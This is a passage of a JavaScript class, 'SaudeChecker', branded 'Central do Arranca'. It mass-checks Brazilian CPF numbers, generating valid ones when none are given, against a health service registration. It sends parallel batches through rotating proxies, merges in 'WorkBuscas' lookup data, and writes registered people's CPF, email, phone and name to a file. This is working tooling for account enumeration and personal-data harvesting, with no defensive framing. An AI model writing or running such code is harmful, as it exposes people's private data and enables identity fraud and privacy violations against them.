      if (finalResult.proxy === 'Sem Proxy' || finalResult.proxy === 'N/A') {
        finalResult.proxy = usedProxy;
      }
      
      const result = finalResult;
      
      // Atualiza contadores
      if (result.success) {
        this.successCount++;
      } else {
        this.errorCount++;
      }
      
      if (result.interpretation === 'registered') {
        this.registeredCount++;
      } else if (result.interpretation === 'not_registered') {
        this.unregisteredCount++;
      } else if (result.interpretation === 'skipped') {
        // CPF pulado (dados insuficientes) - não conta como erro, apenas pula
        // Não incrementa nenhum contador, apenas passa para o próximo
      }
      
      // Adiciona dados do WorkBuscas ao resultado
      result.workbuscas = workbuscasResult.workbuscasData;
      result.workbuscasSuccess = workbuscasResult.success;
      
      // Garante que sempre tem proxy no resultado (não pode ser "Sem Proxy" ou "N/A")
      if (!result.proxy || result.proxy === 'Sem Proxy' || result.proxy === 'N/A') {
        if (this.proxies.length > 0) {
          // Se tinha proxy disponível mas não foi usado, isso é um erro
          const randomProxy = this.getRandomProxy();
          result.proxy = randomProxy ? `${randomProxy.host}:${randomProxy.port}` : 'N/A';
        } else {
          result.proxy = 'N/A';
        }
      }
      
      return result;
      
    } catch (error) {
      this.errorCount++;
      return {
        cpf: cpf || 'N/A',
        success: false,
        error: error.message,
        status: 0,
        interpretation: 'error',
        timestamp: new Date().toISOString()
      };
    }
  }

  /**
   * Verifica múltiplos CPFs em lotes com processamento paralelo (igual ao Gemeos)
   * Se não fornecer CPFs, gera automaticamente
   * @param {Function} statusCallback - Callback para atualizar status em tempo real
   */
  async checkMultipleCPFs(cpfs = [], statusCallback = null) {
    const results = [];
    
    // Se não forneceu CPFs, gera automaticamente
    if (!cpfs || cpfs.length === 0) {
      cpfs = [];
      for (let i = 0; i < this.batchSize; i++) {
        cpfs.push(this.generateValidCPF());
      }
    }
    
    // Processa em lotes (batches) em paralelo
    for (let i = 0; i < cpfs.length; i += this.batchSize) {
      const batch = cpfs.slice(i, i + this.batchSize);
      const batchNumber = Math.floor(i / this.batchSize) + 1;
      const totalBatches = Math.ceil(cpfs.length / this.batchSize);
      
      // Processa todo o lote em paralelo (100% simultâneo, sem delay escalonado)
      const batchPromises = batch.map(async (cpf) => {
        try {
          // Chama checkCPF sem delay para máxima simultaneidade
          const result = await this.checkCPF(cpf, false, statusCallback);
          if (!result.timestamp) {
            result.timestamp = new Date().toISOString();
          }
          this.results.push(result);
          return result;
        } catch (error) {
          this.errorCount++;
          const failed = {
            cpf: cpf,
            success: false,
            error: error.message,
            timestamp: new Date().toISOString(),
            proxy: 'N/A',
            interpretation: 'error'
          };
          this.results.push(failed);
          return failed;
        }
      });
      
      // Aguarda todo o lote processar em paralelo
      const batchResults = await Promise.all(batchPromises);
      results.push(...batchResults);
      
      // Delay entre lotes (não entre CPFs individuais)
      if (i + this.batchSize < cpfs.length) {
        await this.sleep(this.delay);
      }
    }
    
    return results;
  }

  /**
   * Salva resultados em arquivo
   */
  async saveResults(filename = null) {
    if (!filename) {
      const timestamp = new Date().toISOString().replace(/[:.]/g, '-').split('T')[0];
      filename = `saude-valid-cpfs-${timestamp}.txt`;
    }
    
    const listaDir = path.resolve(process.cwd(), 'lista', 'saude');
    if (!fs.existsSync(listaDir)) {
      fs.mkdirSync(listaDir, { recursive: true });
    }
    
    const filePath = path.join(listaDir, filename);
    
    let content = '='.repeat(60) + '\n';
    content += 'CENTRAL DO ARRANCA - SAÚDE DIÁRIA CHECKER\n';
    content += '='.repeat(60) + '\n\n';
    content += `Data/Hora: ${new Date().toLocaleString('pt-BR', { timeZone: 'America/Sao_Paulo' })}\n`;
    content += `Total de resultados: ${this.results.length}\n`;
    content += `CPFs Cadastrados: ${this.registeredCount}\n`;
    content += `CPFs Não Cadastrados: ${this.unregisteredCount}\n`;
    content += `Erros: ${this.errorCount}\n\n`;
    content += '='.repeat(60) + '\n\n';
    
    // Filtra apenas CPFs cadastrados
    const validCPFs = this.results.filter(r => r.interpretation === 'registered');
    
    if (validCPFs.length > 0) {
      content += 'CPFS CADASTRADOS:\n';
      content += '='.repeat(60) + '\n\n';
      
      validCPFs.forEach((result, index) => {
        content += `${index + 1}. CPF: ${result.cpf}\n`;
        if (result.payload) {
          content += `   Email: ${result.payload.email}\n`;
          content += `   Telefone: ${result.payload.phonenumber}\n`;
        }
        if (result.workbuscas) {
          content += `   Nome: ${result.workbuscas.nome || 'N/A'}\n`;
        }
        content += `   Status: ${result.status}\n`;
        content += `   Data/Hora: ${new Date(result.timestamp).toLocaleString('pt-BR')}\n`;
        content += '\n';
      });
    }
    
    await fs.writeFile(filePath, content, 'utf8');
    
    return filePath;
  }

  /**
   * Função de sleep
   */
  sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }
}

module.exports = SaudeChecker;

